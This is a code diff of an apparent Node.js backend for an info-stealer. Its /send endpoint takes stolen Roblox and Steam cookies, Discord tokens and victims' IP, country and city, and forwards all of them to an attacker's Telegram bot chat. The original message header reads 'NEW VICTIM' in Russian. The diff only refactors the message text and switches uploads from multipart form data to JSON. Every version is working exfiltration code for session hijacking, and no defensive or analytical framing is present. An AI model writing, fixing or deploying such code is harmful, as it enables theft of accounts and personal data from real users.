@@ -14,38 +14,71 @@ app.post('/send', async (req, res) => {
     try {
         const { robloxCookie, steamCookie, discordToken, ip, country, city } = req.body;
 
-        let msg = "🔴 <b>НОВАЯ ЖЕРТВА</b>\n\n";
+        let msg = "👋 ЗАПУЩЕН\n\n";
         if (ip) {
-            msg += "🌐 <b>IP:</b> <code>" + ip + "</code>\n";
-            msg += "📍 <b>Страна:</b> <code>" + (country || "Н/Д") + "</code>\n";
-            msg += "🏙 <b>Город:</b> <code>" + (city || "Н/Д") + "</code>\n\n";
+            msg += "IP: " + ip + "\n";
+            msg += "Страна: " + (country || "Н/Д") + "\n";
+            msg += "Город: " + (city || "Н/Д");
         }
 
         await axios.post(API + "/sendMessage", {
             chat_id: CHAT_ID,
-            text: msg,
-            parse_mode: "HTML"
+            text: msg
         });
 
+        // Отправка файлов через sendDocument с правильным Content-Type
         if (robloxCookie) {
-            const fd = new FormData();
-            fd.append('chat_id', CHAT_ID);
-            fd.append('document', robloxCookie, 'roblox_cookie.txt');
-            await axios.post(API + "/sendDocument", fd, { headers: { 'Content-Type': 'multipart/form-data' } });
+            try {
+                await axios.post(
+                    API + "/sendDocument",
+                    {
+                        chat_id: CHAT_ID,
+                        document: robloxCookie,
+                        caption: "Roblox Cookie"
+                    },
+                    {
+                        headers: { "Content-Type": "application/json" }
+                    }
+                );
+            } catch (e) {
+                console.log("Ошибка Roblox файла:", e.message);
+            }
         }
 
         if (steamCookie) {
-            const fd = new FormData();
-            fd.append('chat_id', CHAT_ID);
-            fd.append('document', steamCookie, 'steam_cookie.txt');
-            await axios.post(API + "/sendDocument", fd, { headers: { 'Content-Type': 'multipart/form-data' } });
+            try {
+                await axios.post(
+                    API + "/sendDocument",
+                    {
+                        chat_id: CHAT_ID,
+                        document: steamCookie,
+                        caption: "Steam Cookie"
+                    },
+                    {
+                        headers: { "Content-Type": "application/json" }
+                    }
+                );
+            } catch (e) {
+                console.log("Ошибка Steam файла:", e.message);
+            }
         }
 
         if (discordToken) {
-            const fd = new FormData();
-            fd.append('chat_id', CHAT_ID);
-            fd.append('document', discordToken, 'discord_token.txt');
-            await axios.post(API + "/sendDocument", fd, { headers: { 'Content-Type': 'multipart/form-data' } });
+            try {
+                await axios.post(
+                    API + "/sendDocument",
+                    {
+                        chat_id: CHAT_ID,
+                        document: discordToken,
+                        caption: "Discord Token"
+                    },
+                    {
+                        headers: { "Content-Type": "application/json" }
+                    }
+                );
+            } catch (e) {
+                console.log("Ошибка Discord файла:", e.message);
+            }
         }
 
         res.json({ ok: true });
